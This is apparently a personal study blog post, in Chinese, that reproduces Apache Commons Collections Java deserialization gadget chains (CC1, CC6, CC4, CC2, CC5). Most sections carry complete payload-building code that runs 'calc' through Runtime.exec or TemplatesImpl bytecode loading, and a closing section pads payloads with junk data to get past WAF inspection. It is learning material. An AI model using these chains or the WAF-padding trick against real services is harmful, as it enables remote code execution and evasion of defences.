---
title: CommonsCollections
date: 2022-03-14 17:46:47
tags:
      - java
categories: java
---

实验环境

jdk8u65

commonsCollections 3.2.1

这个学的很吃力,但是每天都坚持,争取一周之内将其理解<!--more-->

-----

> 对于InvokerTransformer的理解,在这里记录一下,防止忘记

https://app.yinxiang.com/shard/s51/nl/33688597/8bf0d8b9-d265-4a61-a2b6-5918bc38706d

目标是通过TransFormer接口的InvokerTransformer实现类中的transform方法实现任意类加载,

**找利用链的过程应该是逆向思维,先找到一个能接受任意参数并且能执行命令方法,然后再反着找谁调用了它,再找谁调用了调用了它的那个函数,最后找到底的并且能走通的类就是入口类????**

这是该方法的源码

```java
public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
        super();
        iMethodName = methodName;
        iParamTypes = paramTypes;
        iArgs = args;
    }

public Object transform(Object input) {
        if (input == null) {
            return null;
        }
        try {
            Class cls = input.getClass();
            Method method = cls.getMethod(iMethodName, iParamTypes);
            return method.invoke(input, iArgs);
                
        } catch (NoSuchMethodException ex) {
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' does not exist");
        } catch (IllegalAccessException ex) {
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
        } catch (InvocationTargetException ex) {
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' threw an exception", ex);
        }
    }
```

通过观察该方法,发现该方法接受一个任意对象为参数,并且通过反射调用方法,方法名和参数在构造方法中可控

先自己写一遍自己认为的能调用exec的代码

```java
InvokerTransformer invokerTransformer = new InvokerTransformer("exec",new Class[]{String.class},new String[]{"calc"});
        invokerTransformer.transform(Runtime.getRuntime());
```

接着拓展这条调用链,找一找有没有不同名的类调用了transform方法

跟着教程在TransformedMap类中找到了一个checkSetValue方法中调用了transform方法

```java
protected Object checkSetValue(Object value) {
        return valueTransformer.transform(value);
    }
```

该类的构造方法为protected,于是在该类中找有无使用了该构造方法的方法,找到一个`decorate`方法

```java
public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {
        return new TransformedMap(map, keyTransformer, valueTransformer);
    }
```

该方法根据注释是一个用来创建transforming map的工厂方法 



setValue调用了checkSetValue方法,checkSetValue方法又调用了transform方法

> 至于为什么会这样呢?

因为TransformedMap继承了`AbstractInputCheckedMapDecorator`这个抽象类,这个抽象类中checkSetValue是抽象方法,被`TransformedMap`实现,所以setValue中`parent.checkSetValue`调用的就是这个被实现的方法

![image-20220310150430013](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220310150430013.png)

![image-20220310150131340](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220310150131340.png)

```java
InvokerTransformer invokerTransformer = new InvokerTransformer("exec",new Class[]{String.class},new String[]{"calc"});
        HashMap<Object,Object> map=new HashMap<Object, Object>() ;
        map.put("key","value");
        Map<Object,Object> decorate = TransformedMap.decorate(map, null, invokerTransformer);//返回一个里面对象类型是Transformer map
        for (Map.Entry entry:decorate.entrySet()
             ) {
            entry.setValue(Runtime.getRuntime());
        }
```

接着在setValue上面再拓展,找有没有在readObject中使用了setValue的类

找到AnnoationInvocationHandler中的readObject方法中有使用setValue

```java
private void readObject(java.io.ObjectInputStream s)
        throws java.io.IOException, ClassNotFoundException {
        s.defaultReadObject();

        // Check to make sure that types have not evolved incompatibly

        AnnotationType annotationType = null;
        try {
            annotationType = AnnotationType.getInstance(type);
        } catch(IllegalArgumentException e) {
            // Class is no longer an annotation type; time to punch out
            throw new java.io.InvalidObjectException("Non-annotation type in annotation serial stream");
        }

        Map<String, Class<?>> memberTypes = annotationType.memberTypes();

        // If there are annotation members without values, that
        // situation is handled by the invoke method.
        for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) {
            String name = memberValue.getKey();
            Class<?> memberType = memberTypes.get(name);
            if (memberType != null) {  // i.e. member still exists
                Object value = memberValue.getValue();
                if (!(memberType.isInstance(value) ||
                      value instanceof ExceptionProxy)) {
                    memberValue.setValue(
                        new AnnotationTypeMismatchExceptionProxy(
                            value.getClass() + "[" + value + "]").setMember(
                                annotationType.members().get(name)));
                }
            }
        }
    }
```



因为Runtime类不能序列化,所以需要将其改装为能够序列化,而Class是可以序列化的

**在invoke的时候,如果是静态方法,第一个参数可以为Null**

```java
Class<Runtime> runtimeClass = Runtime.class;
        Method getRuntime = runtimeClass.getMethod("getRuntime", null);
        Object o = (Runtime)getRuntime.invoke(null, null);
        Method exec = runtimeClass.getMethod("exec", String.class);
        exec.invoke(o,"calc");
```

继续将其改装为`InvokerTransformer`中`transform`方法的版本

```java
public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
        super();
        iMethodName = methodName;
        iParamTypes = paramTypes;
        iArgs = args;
    }
public Object transform(Object input) {
        if (input == null) {
            return null;
        }
        try {
            Class cls = input.getClass();
            Method method = cls.getMethod(iMethodName, iParamTypes);
            return method.invoke(input, iArgs);
                
        } catch (NoSuchMethodException ex) {
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' does not exist");
        } catch (IllegalAccessException ex) {
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
        } catch (InvocationTargetException ex) {
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' threw an exception", ex);
        }
    }
```

```java
//逐步改装
//调用getMethod方法获取getRuntime方法
        Object getRuntimeMethod = new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}).transform(Runtime.class);
        //如法炮制,调用invoke方法,获取runtime对象
        Object runtime = (Runtime)new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}).transform(getRuntimeMethod);
        //调用runtime中的exec方法执行命令
        Object res = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"}).transform(runtime);

```

这里有个疑问,为什么第一句里面传入的是class而不是对象,但是却可以调用其中的方法?

回到前面的问题,因为Runtime.getRuntime()方法时静态方法,所以传递的第一个参数可以为null,也就是说第一个参数对于invoke没有什么影响??

上面的代码可以通过ChainedTransformer再次缩短

```java
//对于里面的函数会进行递归调用,上一个的执行结果会变成下一个的参数传进去,最后返回最终结果
public Object transform(Object object) {
        for (int i = 0; i < iTransformers.length; i++) {
            object = iTransformers[i].transform(object);
        }
        return object;
    }
```

```java
Transformer[] transformers= new Transformer[]{
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        new ChainedTransformer(transformers).transform(Runtime.class);
```

##### 实现

```java
Transformer[] transformers= new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        Transformer Chainedtransform = new ChainedTransformer(transformers);


        HashMap<Object,Object> map=new HashMap<Object, Object>() ;
        map.put("value","value");
        Map<Object,Object> transformedMap = TransformedMap.decorate(map, null, Chainedtransform);
        Class<?> c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> declaredConstructor = c.getDeclaredConstructor(Class.class, Map.class);
        declaredConstructor.setAccessible(true);
        Object o = declaredConstructor.newInstance(Target.class, transformedMap);
        SerializeTest.serialize(o);
        UnSerializeTest.unserialize("C:\\Temp\\test.bin");
```





#### LazyMap

lazyMap中的`get`方法也调用了`transform`方法,可以使用其替代`TransformedMap.checkSetValue`

分析一下lazyMap中的`get`方法的使用

LazyMap顾名思义,就是在创建map的时候不创建key,再get的时候才创建key,并且LazyMap是public的

```java
 public static Map decorate(Map map, Transformer factory) {
        return new LazyMap(map, factory);
    }
```

使用上述"构造方法"创建LazyMap,接着先调用get试试,分析其只有没有key的map才能进入if循环中调用`transform`

```java
public Object get(Object key) {
        // create value for key if key is not currently in the map
        if (map.containsKey(key) == false) {
            Object value = factory.transform(key);
            map.put(key, value);
            return value;
        }
        return map.get(key);
    }
```

```java
Transformer[] transformers= new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        Transformer Chainedtransform = new ChainedTransformer(transformers);
        HashMap<Object,Object> map=new HashMap<Object, Object>() ;
        map.put("aaa","bbb");
     
        Map lazyMap = LazyMap.decorate(map, Chainedtransform);
        lazyMap.get(Chainedtransform);
```

为什么map添加了键值对,还能成功进入`if`循环

找到`containsKey`方法的解释是`map中的containsKey（key）方法是判断该key在map中是否有key存在。如果存在则返回true。如果不存在则返回false`换言之,其判断的是map里面是key是不是在map中存在,而运行时key显然不存在,所以便调用了key的`transform方法`

接下来找能调用`get`方法的类

还得是`AnnotationInvocationHandler`类

![image-20220312160852089](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220312160852089.png)

readObject中的memberTypes是注解的成员变量,无法控制

在该类的`invoke`方法中有一个get方法的调用

这个类实现了`InvocationHandler`接口,根据之前学习的java动态代理的使用,只要有它的代理调用了该类中的任何方法,都会调用invoke从而走到调用`get`



> 如何在`Object result = memberValues.get(member);`中将member改为`ChainedTransformer`

这里其实是我的理解出了问题,经过多次调试,只要通过动态代理调用`AnnotationInvocationHandler`中的方法,就能执行代码,并且传入到LazyMap中的key参数虽然跟着变化,但是还能执行

![image-20220313155923303](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220313155923303.png)

最后找到了原因,因为上一cc链中为了不让AnnotationInvocationHandler改变第一个Transformer中的值,使用了new ConstantTransformer(Runtime.class)在链式调用的时候给下一个Transformer传递值,如果保持这一修改不变,不管外部调用transform方法传递进来的参数是什么,都会被修改为Runtime.class从而执行下去

> 得到的教训,遇到不懂的代码要多耐心调试,跟着代码走下去,不要妄想一下就能看明白



#### CC6

这条链使用了TiedMapEntry.hashCode中对于getValue的调用而调用的get方法

![image-20220313175136879](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220313175136879.png)

![image-20220313175144689](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220313175144689.png)

这里调用get传递的参数是key,所以还是使用`new ConstantTransformer(Runtime.class)`修改传递进去的参数即可,所以实例化的时候key随便传递一个就行了

```java
TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,"sssfs");
        //接着调用它的hashCode方法
        tiedMapEntry.hashCode();
```

成功执行

接下来利用HashMap反序列化的时候会计算key的hashCode从而调用它的hashCode方法

这条链类似于URLDNS那条链的原理,URLDNS中put调用hashCode会消耗掉它为-1的hashCode,这条链呢则会在put的时候调用hashCode方法,到lazyMap的get方法的时候,会给它添加一个key,导致反序列化的时候已经存在了这个key,导致进不了if循环从而无法调用transform方法

```java
public Object get(Object key) {
        // create value for key if key is not currently in the map
        if (map.containsKey(key) == false) {
            Object value = factory.transform(key);
            map.put(key, value);
            return value;
        }
        return map.get(key);
    }
```

所以可以通过remove移除添加进去的key

```java
Transformer[] transformers= new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        Transformer Chainedtransformer = new ChainedTransformer(transformers);


        HashMap<Object,Object> map=new HashMap<Object, Object>() ;
        
		//这里随便传递一个Transformer是为了不在put的时候执行,put完再把ChainedTransformer添加回去
        Map lazyMap = LazyMap.decorate(map, new ConstantTransformer(123));

        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,"aaa");


        HashMap<Object,String> map1=new HashMap();
        Class<? extends Map> lazyMapClass = lazyMap.getClass();
        Field factory = lazyMapClass.getDeclaredField("factory");
        factory.setAccessible(true);

        map.put(tiedMapEntry,"ddd");
        lazyMap.remove("aaa");

        factory.set(lazyMap,Chainedtransformer);
        SerializeTest.serialize(map);
        UnSerializeTest.unserialize("C:\\Temp\\test.bin");
```

注:在学习构造shiro的cc链的时候,shiro中TiedMapEntry第二个参数必须是要transform(key)的key,为什么这里可以乱传递一个呢,因为不管传递的是啥,只要ChainedTransformer开始transform,执行到`new ConstantTransformer(Runtime.class)`,就会被改成`Runtime.class`

### 动态类加载

ClassLoader中有一个defineClass方法,该方法可以从字节码文件加载类,如果能找到一个类既调用了defineClass方法又对类进行了实例化,那么就可以执行类中的静态代码块

ClassLoader中有好多defineClass方法,挨个findUsages,找到一个defineClass在其他包内不是private的调用

![image-20220314151530097](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220314151530097.png)

接着找,找到一个方法能进行实例化

![image-20220314152458340](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220314152458340.png)

在newTransformer这个public方法中调用了它,所以入口找到了,思路就是通过newTransformer



加载完成之后_class数组存储的就是通过字节码加载进来的类

```java
public static void main(String[] args) throws Exception{
        //H:\java\classTest\MyClass
        TemplatesImpl templates=new TemplatesImpl();
        Class<? extends TemplatesImpl> templatesClass = templates.getClass();
        Field name = templatesClass.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates,"aaa");
        Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        byte[] code= Files.readAllBytes(Paths.get("H:\\java\\classTest\\MyClass.class"));
        byte[][] codes={code};
        bytecodes.set(templates,codes);

        /*Field transletIndex = templatesClass.getDeclaredField("_transletIndex");
        transletIndex.setAccessible(true);
        transletIndex.set(templates,0);*/
    	//这块是想多了,后面判断父类是不是指定的类的时候会对_transletIndex变量做出修改,现在改了也没用

        Field tfactory = templatesClass.getDeclaredField("_tfactory");
        tfactory.setAccessible(true);
        tfactory.set(templates,new TransformerFactoryImpl());

        templates.newTransformer();
```

大部分都很容易理解,就是后面有一个空指针异常的地方,会判断加载的class是不是继承了`com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet`类

```java
private static String ABSTRACT_TRANSLET
    = "com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet";
```

![image-20220314160724089](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220314160724089.png)

所以给要加载的类继承该类就行了

```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import java.io.IOException;
public class MyClass extends com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet{
    static {
        try {
            Process calc = Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            e.printStackTrace();
        }

    }
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }
    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
```

通过这个就多了一种代码执行的方法,在ChainedTransformer中通过`transform`调用`newTransformer()`方法从而加载指定类

```java
public static void main(String[] args) throws Exception{
        
        TemplatesImpl templates=new TemplatesImpl();
        Class<? extends TemplatesImpl> templatesClass = templates.getClass();
        Field name = templatesClass.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates,"aaa");
        Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        byte[] code= Files.readAllBytes(Paths.get("H:\\java\\classTest\\MyClass.class"));
        byte[][] codes={code};
        bytecodes.set(templates,codes);


        Field tfactory = templatesClass.getDeclaredField("_tfactory");
        tfactory.setAccessible(true);
        tfactory.set(templates,new TransformerFactoryImpl());

        /*templates.newTransformer();*/

        Transformer[] transformers= new Transformer[]{
                //ConstantTransformer.transforme如什么对象就返回什么对象,刚好在链式调用里面做开头参数
                new ConstantTransformer(templates),

                new InvokerTransformer("newTransformer",null,null),

        };
        Transformer Chainedtransform = new ChainedTransformer(transformers);

        HashMap<Object,Object> map=new HashMap<Object, Object>() ;


        Map lazyMap = LazyMap.decorate(map, new ConstantTransformer(123));

        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,"aaa");


        HashMap<Object,String> map1=new HashMap();
        Class<? extends Map> lazyMapClass = lazyMap.getClass();
        Field factory = lazyMapClass.getDeclaredField("factory");
        factory.setAccessible(true);

        map.put(tiedMapEntry,"ddd");
        lazyMap.remove("aaa");

        factory.set(lazyMap,Chainedtransform);
        /*SerializeTest.serialize(map);*/
        UnSerializeTest.unserialize("C:\\Temp\\test.bin");


    }
```

所以说在这条链里面,最重要的还是前面的transformer方法导致的任意类方法调用



再往上找,找到一个叫`TrAXFilter`的类的构造方法中调用了newTransformer,但是这个类是不可序列化的,所以需要改装,比如说找一个类中的`transform`方法,这个方法可以调用传入的对象的构造方法

![image-20220314173150015](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220314173150015.png)

还真有一个这样的类`InstantiateTransformer`并且它是可以序列化的,它的`transform`方法调用是Class子类的构造方法

![image-20220314175651000](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220314175651000.png)

对代码稍作修改,就可以实现和InvokeTransformer相同的效果了

```java
Transformer[] transformers= new Transformer[]{
        //ConstantTransformer.transformer传什么对象就返回什么对象,刚好在链式调用里面做开头参数
        new ConstantTransformer(TrAXFilter.class),

        new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates})

};
```

### cc4

**commons-collections4.0中的**

首先根据`transform`方法找调用`transform`方法的类,找到一个`TransformingComparator`类,并且该类实现了`serializeable`接口可序列化,它里面的`compare`方法调用了`transfom`方法

![image-20220315233629253](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220315233629253.png)

接着找一个类的`readObject`方法调用compare方法

有一个`PriorityQueue`类

根据调用链先尝试序列化,报错

![image-20220316001101815](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220316001101815.png)

找到原因是`InstantiateTransformer`类在commons-collection4.4版本中取消了对Serializeable接口的继承,让其无法反序列化

还是先把cc版本切换为4.0跟着复现把.....

按照一步步添加进去进行反序列化,发现有个问题,就是size必须大于2,因为`heapify`进行了无符号位右移是否大于0的判断

![image-20220316003358028](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220316003358028.png)

```java
public static void main(String[] args) throws Exception {

        TemplatesImpl templates=new TemplatesImpl();
        Class<? extends TemplatesImpl> templatesClass = templates.getClass();
        Field name = templatesClass.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates,"aaa");
        Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        byte[] code= Files.readAllBytes(Paths.get("H:\\java\\classTest\\MyClass.class"));
        byte[][] codes={code};
        bytecodes.set(templates,codes);
        
        Field tfactory = templatesClass.getDeclaredField("_tfactory");
        tfactory.setAccessible(true);
        tfactory.set(templates,new TransformerFactoryImpl());
        
        Transformer[] transformers= new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),

                new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates})

        };
        Transformer Chainedtransform = new ChainedTransformer<>(transformers);
        TransformingComparator transformingComparator = new TransformingComparator<>(Chainedtransform);
        PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);

        priorityQueue.add(1);
        priorityQueue.add(2);
        SerializeTest.serialize(priorityQueue);
        UnSerializeTest.unserialize("C:\\Temp\\test.bin");

    }
```

在add的时候会调用到`offer`--->`siftUp`--->`siftUpUsingComparator`从而调用到`compare`方法

![image-20220316003551221](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220316003551221.png)

所以效仿之前可以在add之前将TransformingComparator的参数随便弄一个,然后add之后再通过反射来修改

```java
public static void main(String[] args) throws Exception {

        TemplatesImpl templates=new TemplatesImpl();
        Class<? extends TemplatesImpl> templatesClass = templates.getClass();
        Field name = templatesClass.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates,"aaa");
        Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        byte[] code= Files.readAllBytes(Paths.get("H:\\java\\classTest\\MyClass.class"));
        byte[][] codes={code};
        bytecodes.set(templates,codes);

        Field tfactory = templatesClass.getDeclaredField("_tfactory");
        tfactory.setAccessible(true);
        tfactory.set(templates,new TransformerFactoryImpl());

        Transformer[] transformers= new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),

                new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates})

        };
        Transformer Chainedtransform = new ChainedTransformer<>(transformers);
        TransformingComparator transformingComparator = new TransformingComparator<>(new ConstantTransformer<>(1));
        PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);

        priorityQueue.add(1);
        priorityQueue.add(2);

        Class<? extends TransformingComparator> transformingComparatorClass = transformingComparator.getClass();
        Field transformingComparatorClassDeclaredField = transformingComparatorClass.getDeclaredField("transformer");
        transformingComparatorClassDeclaredField.setAccessible(true);
        transformingComparatorClassDeclaredField.set(transformingComparator,Chainedtransform);
        SerializeTest.serialize(priorityQueue);
        UnSerializeTest.unserialize("C:\\Temp\\test.bin");

    }

```

> 总结

在学习过程中,对于java的反射,代理,接口,等等基础知识有了更深刻的理解,尤其是在抽象类的部分,也感受到了什么叫"基础不牢,地动山摇",后序还有几条链没有复现,现在虽然都跟着做了一遍,但也仅仅是做了一遍,要是自己找反序列化链的话,估计没戏,所以接下来自己跟着思维导图,将每一种可能都模仿一层层找的方式复现一遍

![image-20220401003902537](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220401003902537.png)

### CC2

特点是没有用到Transformer数组

```java
public static void main(String[] args) throws Exception{
        TemplatesImpl templates=new TemplatesImpl();
        Class<? extends TemplatesImpl> templatesClass = templates.getClass();
        Field name = templatesClass.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates,"aaa");
        Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        byte[] code= Files.readAllBytes(Paths.get("H:\\java\\classTest\\MyClass.class"));
        byte[][] codes={code};
        bytecodes.set(templates,codes);

        Field tfactory = templatesClass.getDeclaredField("_tfactory");
        tfactory.setAccessible(true);
        tfactory.set(templates,new TransformerFactoryImpl());


        InvokerTransformer invokerTransformer = new InvokerTransformer("newTransformer",new Class[]{},new Object[]{});


        TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1));
        PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);


        priorityQueue.add(templates);
        priorityQueue.add(1);
		//一样是防止add直接执行代码,也可以将newTransformer方法改为toString实现同样效果
        Class<? extends TransformingComparator> transformingComparatorClass = transformingComparator.getClass();
        Field transformer = transformingComparatorClass.getDeclaredField("transformer");
        transformer.setAccessible(true);
        transformer.set(transformingComparator,invokerTransformer);

        SerializeTest.serialize(priorityQueue);
        UnSerializeTest.unserialize("C:\\Temp\\test.bin");

    }
```



### CC5

基本没有啥可以说的东西,我感觉是最简单的一条链了,唯一需要修改的地方就是在`BadAttributeValueExpException`的构造函数中会直接调用`toString`,需要先传递null然后等序列化之前再利用反射改回来

![image-20220316155807311](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220316155807311.png)

```java
public static void main(String[] args) throws Exception{




        Transformer[] transformers= new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        Transformer Chainedtransform = new ChainedTransformer(transformers);

        HashMap<Object,Object> map=new HashMap<Object, Object>() ;

        Map lazyMap = LazyMap.decorate(map, Chainedtransform);

        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "aaa");

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);

        Class<? extends BadAttributeValueExpException> badAttributeValueExpExceptionClass = badAttributeValueExpException.getClass();
        Field val = badAttributeValueExpExceptionClass.getDeclaredField("val");
        val.setAccessible(true);
        val.set(badAttributeValueExpException,tiedMapEntry);
        
        SerializeTest.serialize(badAttributeValueExpException);
        UnSerializeTest.unserialize("C:\\Temp\\test.bin");
        
    }
```







### 为gadget添加大量垃圾数据

大多数WAF受限于性能影响，当request足够大时，WAF可能为因为性能原因作出让步，超出检查长度的内容，将不会被检查。

参考https://mp.weixin.qq.com/s/wvKfe4xxNXWEgtQE4PdTaQ

通过ArrayList添加大量垃圾数据进去,因为ArrayList的`readObject`方法存在会对List中的每一项除了transient的所有数据序列化,所以可以利用ArrayList实现简单的垃圾数据添加

```java
ArrayList arrayList = new ArrayList();
        StringBuilder sb=new StringBuilder();
        for(int i=0;i<500000;i++){
            sb.append("a");
        }
        arrayList.add(sb);
        arrayList.add(priorityQueue);
        SerializeTest.serialize(arrayList);
```

![image-20220330231216877](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220330231216877.png)

生成的序列化流也十分`壮观`,鼠标滚了半天
